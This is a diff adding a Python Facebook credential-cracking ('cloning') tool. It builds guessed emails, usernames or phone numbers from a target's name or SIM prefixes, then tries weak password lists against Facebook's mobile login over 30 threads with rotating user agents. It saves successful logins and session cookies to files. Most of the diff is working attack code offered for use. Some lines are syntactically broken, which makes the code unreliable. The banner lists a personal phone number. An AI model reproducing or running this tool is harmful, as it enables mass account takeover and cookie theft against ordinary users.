@@ -78,22 +78,202 @@ for xd in range(10000):
     ugen.append(uaku2)
 logo = ("""
 
-\x1b[1;93m   ###    ##    ##  #######  ##    ## ##    ## ##     ##  #######  ##     ##  ######  
-  ## ##   ###   ## ##     ## ###   ##  ##  ##  ###   ### ##     ## ##     ## ##    ## 
- ##   ##  ####  ## ##     ## ####  ##   ####   #### #### ##     ## ##     ## ##       
-##     ## ## ## ## ##     ## ## ## ##    ##    ## ### ## ##     ## ##     ##  ######  
-######### ##  #### ##     ## ##  ####    ##    ##     ## ##     ## ##     ##       ## 
-##     ## ##   ### ##     ## ##   ###    ##    ##     ## ##     ## ##     ## ##    ## 
-##     ## ##    ##  #######  ##    ##    ##    ##     ##  #######   #######   ######
+\x1b[1;93m
+   db    88b 88  dP"Yb  Yb  dP 
+  dPYb   88Yb88 dP   Yb  YbdP  
+ dP__Yb  88 Y88 Yb   dP  dPYb  
+dP""""Yb 88  Y8  YbodP  dP  Yb 
+______CLONING_ANOX_______
+[+]==============================================
+[+] CREATED BY   :  ANOX 
+[+] COUNTRY        :  INDIA
+[+] ON GITHUB     :  SYCO-ANOX
+[+] TOOL OWNER :  +91 8302788872
+[+] TOOL VERSION :  5.0
+[+]==============================================""")
 
- ######  ##    ## ########  ######## ########                                         
-##    ##  ##  ##  ##     ## ##       ##     ##                                        
-##         ####   ##     ## ##       ##     ##                                        
-##          ##    ########  ######   ########                                         
-##          ##    ##     ## ##       ##   ##                                          
-##    ##    ##    ##     ## ##       ##    ##                                         
- ######     ##    ########  ######## ##     ##                                        
 
+class Main:
+    def __init__(self):
+        self.id = []
+        self.ok = []
+        self.cp = []
+        self.loop = 0
+        os.system("clear")
+        print(logo)
+        print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
+        print(" \033[1;97m[1] FACEBOOK EMAIL ID CLONING     \033[1;91m[WORKING] ")
+        print(" \033[1;97m[2] FACEBOOK USERNAME CLONING     \033[1;35m[BEST]")
+        print(" \033[1;97m[3] FACEBOOK VIP RANDOM CLONING   \033[1;33m[FIRE]")
+        print(" \033[1;97m[0] Exit")
+        print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
+        Snigdho =input(" [√] Choose : ")
+        if Snigdho in ["1", "01"]:
+            v1()
+        if Snigdho in ["2", "02"]:
+            v2()
+        if Snigdho in ["3","03"]:
+            v3()
+        if Snigdho in [" 0", "00"]:
+            exit()
+        else:
+            exit()
+def v1():
+    user=[]
+    os.system('clear')
+    print(logo)
+    kode = input(' [❤️]  TERGET FIRST NAME : ')
+    kodex = input(' ❤️] TERGET LAST NAME :  ')
+    print(' [🤝] example Doamin : @gmail.com, @yahoo.com ')
+    doamin = input(' [📧]  Input Doamin  : ')
+    limit = int(input('[?] ENTET YOUR CRACK LIMIT : '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as yaari:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print(' [🔥]  Total ids:\033[1;92m '+tl)
+        print(f"\033[1;97m [🔥]  Target -NAME:\033[1;92m {doamin}")
+        print(' \033[1;97m[🔥]  The process has been started')
+        print(' [🔥]  Wait for ids airoplane mode on off ')
+        print(50*'_')
+        for guru in user:
+            uid = kode+kodex+guru+doamin
+            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
+            yaari.submit(rcrack1,uid,pwx,tl)
+    print(50*'_')
+    print(' [♥] Crack process has been completed')
+    print(' [♥] Ids saved in ok.txt,cp.txt')
+    print(50*'_')
+def v2():
+    user=[]
+    os.system('clear')
+    print(logo)
+    kode = input(' [🔥]  TERGET FIRST NAME : ')
+    kodex = input(' [🔥] TARGET LAST NAME :  ')
+    doamin = '.'
+    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as yaari:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print(' [🔥]  Total ids:\033[1;92m '+tl)
+        print(f"\033[1;97m [💛]  Target Doamin:\033[1;92m Facebook CLONING (name)")
+        print(' \033[1;97m[💛]  The process has been started')
+        print(' [💛]  Wait for ids ')
+        print(50*'_')
+        for guru in user:
+            uid = kode+doamin+kodex+guru
+            pwx = [kode,kode kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
+            yaari.submit(rcrack1,uid,pwx,tl)
+    print(50*'_')
+    print(' [💜] Crack process has been completed')
+    print(' 💙] Ids saved in ok.txt,cp.txt')
+    print(50*'_')
+def v3():
+    user=[]
+    os.system('clear')
+    print(logo)
+    print(" INDIA SIM CODE=><>< +91637,+91981,+91974,+91830,+91937")
+    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
+    print(" \033[1;32mPAK SIM CODE=><>< +92301,+92302,+92303,+92305")
+    print(" \033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
+    print(" NOTE ; THOSE  WHO STAY IN THEIR COUNTRY THEY CAN GIVE THEIR SIM CODE NUNBER TO FACEBOOK RANDOM ID CLONE")
+    print(" \033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
+    
+    kode = input(' [📞] ENTER SIM CODE: ')
+    kodex = ''.join(random.choice(string.digits) for _ in range(2))
+    kod = ''.join(random.choice(string.digits) for _ in range(2))
+    doamin = ' FACEBOOK VIP CLONING (INDIAN NUMBER) '
+    limit = int(input('[?] ENTER YOUR CRACK LIMiT : '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(4))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as yaari:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print(' \033[1;33m[>>]  TOTAL IDS :\033[1;92m '+tl)
+        print(f"\033[1;33m[>>]  YOUR TERGET CRACK MENU:\033[1;92m {doamin}")
+        print(' \033[1;33m[>>]  THE CRACK PROCESS HAS BEEN STARTED')
+        print(' \033[1;33m[>>]  WAIT FOR IDS AIROPLANE MODE ON OFF')
+        print(50*'_')
+        for guru in user:
+            uid = kode+kodex+kod+guru
+            pwx = [kode+kodex+kod+guru,kod+guru,59039200,57575751,'57273200']
+            yaari.submit(rcrack1,uid,pwx,tl)
+    print(50*'_')
+    print(' [♥] Crack process has been completed')
+    print(' [♥] Ids saved in ok.txt,cp.txt')
+    print(50*'_')
+def rcrack1(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            sys.stdout.write('\r[\033[1;92mANOX--\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.flush()
+            free_fb = session.get('https://free.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'mbasic.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
+            'path': '/login/device-based/login/async/?refsrc=deprecated&lwv=100',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="108", "Google Chrome";v="108"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"macOS"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print(f"\033[38;5;46m[ANOX-OK🌻] {uid}|{ps}")
+                print(f"\n[COOKIE✅️] : {coki}")
+                open('/sdcard/ANOX911/ok.txt', 'a').write( uid+' | '+ps+'|' coki'\n')
+                oks.append(uid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[82:97]
+                print(f"\x1b[38;5;196m[ANOX-CP😅] {uid}|{ps}")
+                open('/sdcard/ANOX911-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write(f'\r\033[m[ANOX911] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.flush()
+    except:
+        pass
+Main()
 [+]==============================================
 [+] CREATED BY   :  ANONYMOUS U7P4L
 [+] COUNTRY      :  BANGLADESH 
